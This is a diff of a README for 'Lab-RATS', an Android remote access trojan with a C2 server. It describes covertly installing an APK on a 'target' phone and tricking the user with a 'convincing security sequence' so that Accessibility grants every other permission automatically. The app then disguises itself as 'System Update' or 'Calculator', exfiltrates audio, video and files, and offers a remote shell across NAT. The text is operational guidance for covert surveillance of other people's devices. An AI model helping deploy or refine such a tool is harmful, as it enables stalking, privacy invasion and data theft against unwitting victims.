@@ -29,7 +29,7 @@ alt="Typing Banner"
  />
 </p>
 
-**Lab-RATS leverages the unique characteristics of publicly routable IPv6 addresses assigned by modern Wi-Fi and cellular *(5G/LTE)* carriers**. By **binding the control server directly to a device's Global Unicast Address** *(GUA)*, the tool **completely bypasses Carrier-Grade NAT** *(CGNAT)* and **inbound firewall restrictions**. This architecture **enables seamless, Zero-Configuration peer-to-peer** *(P2P)* **remote access from any modern web browser worldwide**—completely **eliminating the need for router manipulation, port 
+**Lab-RATS leverages the unique characteristics of publicly routable IPv6 addresses assigned by modern Wi-Fi and cellular *(5G/LTE)* carriers**. By **binding the control server directly to a device's Global Unicast Address** *(GUA)*, the tool **completely bypasses Carrier-Grade NAT** *(CGNAT)* and **inbound firewall restrictions**. This architecture **enables seamless, Zero-Configuration peer-to-peer** *(P2P)* **remote access from any modern web browser worldwide**—completely **eliminating the need for router manipulation, port
 forwarding**, or **third-party tunneling services** like **Ngrok** or **Pinggy**.
 <details>
   <summary>📸 Click to View IPv6 Exploit Vector</summary>
@@ -57,8 +57,8 @@ forwarding**, or **third-party tunneling services** like **Ngrok** or **Pinggy**
 - **Resize logos automatically** for **all Android screen densities**.
 
 ### 📱 PC/Mobile Responsive:
-- The **remote web interface** is 
-**fully optimized** for **both PC** and **smartphone browsers**, featuring a **touch-friendly layout, adaptive navigation tabs**, and **scalable UI elements** for monitoring **from any device**.
+- The **remote web interface** is
+  **fully optimized** for **both PC** and **smartphone browsers**, featuring a **touch-friendly layout, adaptive navigation tabs**, and **scalable UI elements** for monitoring **from any device**.
 
 ---
 
@@ -241,7 +241,7 @@ data.stealth === "true") ? "ACTIVE" : "OFF",
 
 ### ✌🏻 NEW! Option 2: Tactical Node.js Backend *(Upgraded)*
 **Best for professional fleet management** and **Automatic File Exfiltration**.
-**Quick Deployment on** <a href="https://render.com" target="_blank">Render.com</a> 
+**Quick Deployment on** <a href="https://render.com" target="_blank">Render.com</a>
 
 **1. Fork the Lab-RATS-v1.6 repository**.
 <br>**2. Create a new Web Service on Render** and **connect your Lab-RATS repo**.
@@ -254,7 +254,7 @@ data.stealth === "true") ? "ACTIVE" : "OFF",
   <br>
   <img src="https://github.com/user-attachments/assets/1d97c7de-2c64-45ff-8653-9c3c0ac2c772" alt="Full Web Page Screenshot" width="80%">
 </details>
-  
+
 **Advantages of Option 2**:
 - 🌐 **Dual-Stack IP Binding**: **Full support for both IPv4 and IPv6 connections**, **enabling seamless C2 telemetry** and **reverse WebSocket tunneling** across **cellular carrier NAT64** and **dual-stack Wi-Fi networks worldwide**.
 - 📂 **Exfiltration Vault**: **Audio/Video recordings** are automatically uploaded and **stored on your server**.
@@ -272,9 +272,9 @@ To **Build, Compile**, and **Deploy Lab-RATS** or **Host the C2 server**, ensure
 
 ### 1. Workstation & Build Requirements: *(For Building APKs)*
 * **Java Development Kit (JDK)**: **JDK 17 or JDK 21** *(JDK 21 recommended)*.
-  * Ensure `JAVA_HOME` is set in your environment paths.
+    * Ensure `JAVA_HOME` is set in your environment paths.
 * **Android SDK**: **Android SDK 34** *(API Level 34)* or **higher**.
-  * **Build-Tools**: Version `34.0.0` or higher *(includes `aapt2`, `zipalign`, and `apksigner`)*.
+    * **Build-Tools**: Version `34.0.0` or higher *(includes `aapt2`, `zipalign`, and `apksigner`)*.
 * **Python 3.x**: Required for **Option 7: Smali Surgery & APK Binder** *(`binder.py`)*.
 * **Gradle**: Handled automatically via the included `./gradlew` *(Gradle 8.10+)*.
 
@@ -287,7 +287,7 @@ To **Build, Compile**, and **Deploy Lab-RATS** or **Host the C2 server**, ensure
 * **Minimum OS**: **Android 5.0** *(Lollipop/API 21)* or **higher**.
 * **Target OS**: **Android 14 - 17** *(API 34 - 37)* **fully supported**.
 * **Supported Devices**: **Samsung, Google Pixel, OnePlus, Xiaomi, Motorola, HTC, LG**, and **generic Android devices/
-emulators**.
+  emulators**.
 
 ### 4. Operating System Compatibility:
 * 🐧 **Linux**: **Kali Linux, Ubuntu, Debian, Arch** *(Full support for build scripts & C2 server)*.
@@ -337,8 +337,8 @@ emulators**.
 #### C. Installation & Initialization:
 Once the **Target device** downloads the **APK**:
 1.  **Manual Sideload**: If you have **physical access to the device**, use `adb install signed.apk`
-2.  **Permissions (CRITICAL)**: **Open the app ONCE**. It will **prompt for necessary permissions** *(Camera, SMS, Files, etc)*.
-    -  **Remote Permission Prompt**: If the **user skips some permissions**, you can **remotely trigger the system prompt again** from the **Ghost Tab** using the **REPAIR PERMISSIONS** button.
+2.  **NEW! 'One-Click' Permissions (CRITICAL)**: **Open the app ONCE**. **Now only the Initial Pop-up *(Accessibility Services)* must be Manually toggled on**, **ALL other permissions are Auto-Granted by the system** with a **convincing security sequence**.
+-  **Remote Permission Prompt**: If the **user skips some permissions**, you can **remotely trigger the system prompt again** from the **Ghost Tab** using the **REPAIR PERMISSIONS** button.
 3.  **Self-Vanishing**: A **few seconds after launch**, the app will **automatically replace its icon and name** with the **decoy you chose during build** *("System Update", "Calculator"...etc)*.
 4.  **Uplink Confirmation**: Check your **Google Sheet or Render C2. Within 5 seconds of initialization**, the **Device ID, Connection Type, IP Address & Port, C2 Dashboard Link, Battery %, Stealth & Charging Status and Device Storage will appear in the log**.
 
@@ -392,15 +392,15 @@ https://github.com/user-attachments/assets/9cb336c8-748d-48ce-9c8f-f0065654be24
 
 ---
 
-### Lab-RATS Initial Install Sequence:
+### NEW! Initial Install Sequence *(One-Click)*:
 
-https://github.com/user-attachments/assets/dbeffae9-8470-4592-a314-1fabc5a9362d
+https://github.com/user-attachments/assets/1470d7f8-7e9f-4ccd-8570-056ead30ec30
 
 ---
 
-### C2 Dashboard (PC Interface) - Remote Shell & Decoys:
+### C2 Dashboard *(PC Interface)* - Remote Shell & Decoys:
 
-https://github.com/user-attachments/assets/8cb56f9d-3f40-4a6f-bddc-79bbbf9c273e
+https://github.com/user-attachments/assets/0bd5111d-1027-4a00-9086-5480d4c63e3d
 
 ---
 
